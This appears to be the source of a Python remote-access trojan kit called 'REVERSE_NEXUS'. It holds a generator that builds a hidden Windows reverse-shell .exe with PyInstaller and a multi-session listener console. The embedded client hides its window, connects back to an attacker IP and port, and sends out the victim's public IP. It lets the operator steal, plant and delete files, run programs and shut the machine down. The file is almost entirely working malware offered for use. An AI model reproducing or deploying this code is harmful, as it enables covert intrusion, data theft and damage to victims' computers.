from multiprocessing import connection
import socket
import os
#from vidstream import StreamingServer
#import threading
def generatePayload(ip, port):
    os.system('pip install Pyinstaller')
    code = f"""from http import client
from multiprocessing import connection
import socket
import os
import time
import requests
import win32gui
import win32con
import threading

def switch(word):
    if word == "cd":
        return 1
    elif word == "dir":
        return 2
    elif word == "remove":
        return 3
    elif word == "restart":
        return 4
    elif word == "loading_file":
        return 5
    elif word == "create_take":
        return 6
    elif word == "create_past":
        return 7
    elif word == "shutdown": #shutdown -s -t 00
        return 8
    elif word == "off":
        return 9
    elif word == "run":
        return 10
    elif word == "live":
        return 11


reverse = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

reverse.connect(('{ip}', {port}))


#-------------------------------------------------------------------

def loadfile(nameFile):
    with open(nameFile, "rb") as file:
        while True:
            data = file.read(1024)  
            if not data:
                break
            reverse.send(data)
    
            
def writefile(nameFile, connect):
    recived_data = b''
    if nameFile == "":
        nameFile = "null"
    while True:
        data = connect.recv(1024)
        if not data:
            break
        if data.endswith(b"END_OF_FILE"):
            recived_data += data[:-len(b"END_OF_FILE")]
            break
        recived_data += data

    with open(nameFile,'wb') as file:
        file.write(recived_data)
        

def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info['ip']
#-----------------------------------------------------------------


os.chdir('C:/Users')

key_acesss = True

delimiter_bytes = False

get_ip = False
hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
message = ""
while key_acesss:
    try:
        
        if delimiter_bytes == True:
            time.sleep(1)
            delimiter_bytes = False
            
        atual_dir = str(os.getcwd())
        
        if get_ip == False:
            public_ip = get_public_ip()
            get_ip = True
            
        atual_dir += ";" + public_ip + message
        reverse.send(atual_dir.encode())
        command = reverse.recv(1024).decode()
        message = ""
        words = command.split(" ")
        
        for word in words:
            option = switch(word)
            if option == 1:
                try:
                    os.chdir(command.replace(command.split(" ")[0], "").replace(" ","",1))
                except Exception as e:
                    message = ";" + str(e)
                break
            elif option == 2:
                atual_dir = ""
                list_dir = str(os.listdir(os.getcwd()))
                reverse.send(list_dir.encode())
                reverse.send(b'END_OF_DIR')
                check = reverse.recv(1024).decode()
                break
                    
            elif option == 3:
                os.remove(words[1])
                break
            elif option == 4:
                os.chdir('C:/Users')
                break
            elif option == 5:
                file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                try:
                    loadfile(file)
                    reverse.send(b"END_OF_FILE")
                    delimiter_bytes = True
                    check = reverse.recv(1024).decode()                    
                    break
                except Exception as e:
                    message = ";" + str(e)
                    reverse.send(b"ERROR_FILE_NOT_EXIST!")
                    reverse.send(b"END_OF_FILE")
                    check = reverse.recv(1024).decode()
                    break
                

            elif option == 6:
                file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                writefile(file, reverse)
                atual_dir= ""
                
                break
            elif option == 7:
                os.mkdir(words[1])
                break
            elif option == 8:
                os.system('shutdown -s -t 00')
                break
            elif option == 9:
                key_acesss = False
                reverse.close()
                break
            elif option == 10:
                os.system("start " + words[1])
                break
            elif option == 11:
              #  vitm = ScreenShareClient('localhost',3232)
               # t = threading.Thread(target=vitm.start_stream)
               # t.start()      
                break                


            
    except Exception as e:
        print("Error : " , e)
        reverse.connect(('{ip}', {port}))
                """
    with open("reverse.py", 'w') as file:
        file.write(code)
    file.close()
    
    os.system('pyinstaller reverse.py --onefile')
    print("|Payload Create Sucess!")
    
def loadfile(conn,nameFile):
        with open(nameFile, "rb") as file:
            while True:
                data = file.read(1024)  
                if not data:
                    break
                conn.send(data)
        print("|File Enviado!")

                
                
def writefile(conn,nameFile):
    recived_data = b''
    if nameFile == "":
        nameFile = "null"
    while True:
        data = conn.recv(1024)
        if not data:
            break
            
        if data.endswith(b"END_OF_FILE"):
            recived_data += data[:-len(b"END_OF_FILE")]
            break
        recived_data += data
        
    conn.send(b'Ok')
    with open(nameFile,'wb') as file:
        file.write(recived_data)



outNexus = True

class Nexu:
    def __init__(self,conn, address, id):
        self.conn = conn
        self.address = address
        self.key_acesss = True
        self.removed = False
        self.id = id

    def start_nexu(self):

        dirControl = False 
        atual_dir = ""
        commands_ok = ["cd","dir","remove","restart","loading_file","create_take","create_past","shutdown","off", "run","live"]
        while self.key_acesss: 
            try:       
                if dirControl == True:  
                    list_dir = ""
                
                    while True:
                        data = self.conn.recv(1024).decode('utf-8', errors='ignore')
                        if not data:
                            break
                        if data.endswith('END_OF_DIR'): 
                            break            
                        list_dir += data
                        
                    list_dir = list_dir.replace("END_OF_DIR","")
                    self.conn.send(b'Ok')
                    for dirs in list_dir.split("',"):
                        print("| " + dirs + " |")
                
                    dirControl = False

                atual_dir = self.conn.recv(1024).decode()
                atual_dir = atual_dir.split(";") #GNG
                if(len(atual_dir) == 3):
                    print("Error in : " + atual_dir[2])
                    command = str(input('NEXUS>' + "[" + atual_dir[0] + '] ' + "->" + "["+ atual_dir[1] +']: ')) 
                else:
                    command = str(input('NEXUS>' + "[" + atual_dir[0] + '] ' + "->" + "["+ atual_dir[1] +']: ')) 
                    
                firstcommand = command.split(" ")
                teste_valid_command = False
                
                for commands_write in commands_ok:
                    if firstcommand[0] == commands_write:
                        teste_valid_command = True
                    
                    
                if teste_valid_command == True:
                    self.conn.send(command.encode())
                elif firstcommand[0] == "return":
                        global outNexus
                        outNexus = True
                        self.key_acesss = False
                        self.conn.send(command.encode())
                        
                else:
                    print("| HELP------> Commands_valids                                |")
                    print("| cd + name past [Enter to past]                             |")        
                    print("| dir [view directorys]                                      |")
                    print("| remove + nameFile [delete file to pc for reverse]          |")
                    print("| restart [back past User]                                   |")
                    print("| loading_file + nameFile [loading file from reverse to you] |")
                    print("| create_take [create file from you to reverse]              |")
                    print("| shutdown [off_pc reverse]                                  |")
                    print("| off [close conection]                                      |")
                    print("| run for execute one process                                |")

                    self.conn.send(command.encode())
                atual_dir = ""
            
                if command == 'dir':
                    dirControl = True
                else:
                    dirControl = False
                    
                if command == 'off':
                    outNexus = True
                    self.key_acesss = False
                    self.removed = True
                
                if 'create_take' in command:
                    file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                    try:
                        loadfile(self.conn,file)
                        self.conn.send(b"END_OF_FILE")
                    except Exception as e:
                        print("File not found")
                        self.conn.send(b"FILE_NOT_FOUND")
                        self.conn.send(b"END_OF_FILE")
                
                if 'loading_file' in command:
                    file = command.replace(command.split(" ")[0], "").replace(" ","",1)
                    writefile(self.conn,file)      
                if 'live' == command:
                    pass
                 #   server_ws = StreamingServer(ip,3232)
                  #  t = threading.Thread(target=server_ws.start_server)
                  #  t.start()
                  #  while input("Comand :> ") != 'stop':
                   #     continue

                   # server_ws.stop_server()        

            except Exception as e:
                print("|Error : " , e)
                self.key_acesss = False
    


    

        


os.system('cls')
os.system('color 5')
print('|-----------------------------------------------------------------------------------------------------------------------')
print('|██████╗░ ███████╗ ██╗░░░██╗ ███████╗ ██████╗░ ░██████╗ ███████╗ ░░░░░░░░ ███╗░░██╗ ███████╗ ██╗░░██╗ ██╗░░░██╗ ░██████╗')
print('|██╔══██╗ ██╔════╝ ██║░░░██║ ██╔════╝ ██╔══██╗ ██╔════╝ ██╔════╝ ░░░░░░░░ ████╗░██║ ██╔════╝ ╚██╗██╔╝ ██║░░░██║ ██╔════╝')
print('|██████╔╝ █████╗░░ ╚██╗░██╔╝ █████╗░░ ██████╔╝ ╚█████╗░ █████╗░░ ░░░░░░░░ ██╔██╗██║ █████╗░░ ░╚███╔╝░ ██║░░░██║ ╚█████╗░')
print('|██╔══██╗ ██╔══╝░░ ░╚████╔╝░ ██╔══╝░░ ██╔══██╗ ░╚═══██╗ ██╔══╝░░ ░░░░░░░░ ██║╚████║ ██╔══╝░░ ░██╔██╗░ ██║░░░██║ ░╚═══██╗')
print('|██║░░██║ ███████╗ ░░╚██╔╝░░ ███████╗ ██║░░██║ ██████╔╝ ███████╗ ███████╗ ██║░╚███║ ███████╗ ██╔╝╚██╗ ╚██████╔╝ ██████╔╝')
print('|╚═╝░░╚═╝ ╚══════╝ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚═╝ ╚═════╝░ ╚══════╝ ╚══════╝ ╚═╝░░╚══╝ ╚══════╝ ╚═╝░░╚═╝ ░╚═════╝░ ╚═════╝░')
print('|-----------------------------------------------------------------------------------------------------------------by Ws')
# sessions, session 2, create session
count_nexus = -1
nexus_list = []
atual_nexus = 0
inicial_nexus = True
createServer = False
ip = 0
port = 0

while True:
    
    os.system('cls')
    os.system('color 5')
    print('|-----------------------------------------------------------------------------------------------------------------------')
    print('|██████╗░ ███████╗ ██╗░░░██╗ ███████╗ ██████╗░ ░██████╗ ███████╗ ░░░░░░░░ ███╗░░██╗ ███████╗ ██╗░░██╗ ██╗░░░██╗ ░██████╗')
    print('|██╔══██╗ ██╔════╝ ██║░░░██║ ██╔════╝ ██╔══██╗ ██╔════╝ ██╔════╝ ░░░░░░░░ ████╗░██║ ██╔════╝ ╚██╗██╔╝ ██║░░░██║ ██╔════╝')
    print('|██████╔╝ █████╗░░ ╚██╗░██╔╝ █████╗░░ ██████╔╝ ╚█████╗░ █████╗░░ ░░░░░░░░ ██╔██╗██║ █████╗░░ ░╚███╔╝░ ██║░░░██║ ╚█████╗░')
    print('|██╔══██╗ ██╔══╝░░ ░╚████╔╝░ ██╔══╝░░ ██╔══██╗ ░╚═══██╗ ██╔══╝░░ ░░░░░░░░ ██║╚████║ ██╔══╝░░ ░██╔██╗░ ██║░░░██║ ░╚═══██╗')
    print('|██║░░██║ ███████╗ ░░╚██╔╝░░ ███████╗ ██║░░██║ ██████╔╝ ███████╗ ███████╗ ██║░╚███║ ███████╗ ██╔╝╚██╗ ╚██████╔╝ ██████╔╝')
    print('|╚═╝░░╚═╝ ╚══════╝ ░░░╚═╝░░░ ╚══════╝ ╚═╝░░╚═╝ ╚═════╝░ ╚══════╝ ╚══════╝ ╚═╝░░╚══╝ ╚══════╝ ╚═╝░░╚═╝ ░╚═════╝░ ╚═════╝░')
    print('|-----------------------------------------------------------------------------------------------------------------by Ws')
    option = input('\n| you need -> ')

    while outNexus == True:
       
            
        if option == 'nexus':
            for s in range(count_nexus + 1):
                print("|[nexus -> " + str(nexus_list[s].id) + "]")
                    
        elif option.split(" ")[0] == "nexu":
            if len(option.split(" ")) == 2 and int(option.split(" ")[1]) < len(nexus_list): 
                option = option.split(" ")[1]
                atual_nexus = option
                inicial_nexus = False
                outNexus =False
            else:
                print("|[ Connection not found!! ]")


        elif option.split(" ")[0] == "server":
            if len(option.split(" ")) == 3:
                ip = option.split("server")[1].split(" ")[1]
                port = int(option.split("server")[1].split(" ")[2])

            else:
                print("|Invalida command :(")
                print("| nexu 3               | example")
                print("| server localhost 8080  | example")


        elif "create payload" in option:
            ip = input("IP : ")
            port = input("PORT : ")
            generatePayload(ip,port)

        elif "start" == option:
            outNexus = False
            break
        elif "update" == option:
                inicial_nexus = True
                outNexus =False
        else:
            print("|[Commands Valids !]")
            print("|[create payload -> create a new payload .exe                     ]")
            print("|[nexus -> list all sessions                                      ]")
            print("|[nexu (numberTheCOnnection) - > select your connect              ]")
            print("|[server localhost 8080 -> init server with connection the started]")
            print("|[update -> recived more connectios                               ]")
            print("|[start -> init service :)                                        ]")
        option = input('\n|the now -> ')       
    
    removed_to_list = False
    
    while outNexus == False:
        if createServer == False:
            nexus = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

            os.system('color 5')

            print("|Listen Conection...")
            nexus.bind((ip,int(port)))
            nexus.listen(1)
            createServer = True
        elif inicial_nexus == True:
            os.system('cls')
            os.system('color 5')
            print('|          ####                        ####  ')      
            print('|          ########  ############  ########  ')      
            print('|          ################################  ')    
            print('|          ##############################    ')     
            print('|            ############################    ')      
            print('|            ##########################      ')     
            print('|          ################################  ')      
            print('|        ####################################')      
            print('|        ####################################')      
            print('|          ########  ############  ########  ')      
            print('|        ##########    ########    ########  ')     
            print('|        ############  ########  ############')      
            print('|            ############################    ')      
            print('|                ####################        ')      
            print('|                  ################          ')      
            print('|                  ####      ####            ')      
            print('|                    ####    ####            ')      
            print('|                    ##########              ')      
            print('|                        ##                  ')  
            print('|                                       By Ws')  
            print("|Listen Conections... :]")
            
            conn, address = nexus.accept()
            count_nexus = count_nexus + 1
            nexu_connection = Nexu(conn,address,count_nexus)
            nexu_connection.start_nexu()
            
            nexus_list.append(nexu_connection)
            
            if nexu_connection.removed:
                nexus_list.remove(nexu_connection)
                count_nexus = count_nexus - 1

            
        elif inicial_nexus == False:
            nexus_list[int(atual_nexus)].key_acesss = True
            nexus_list[int(atual_nexus)].start_nexu()
            if nexus_list[int(atual_nexus)].removed:
                 nexus_list.remove(nexus_list[int(atual_nexus)])
                 count_nexus = count_nexus - 1
                
            
                
            
            
            
        
        

                
    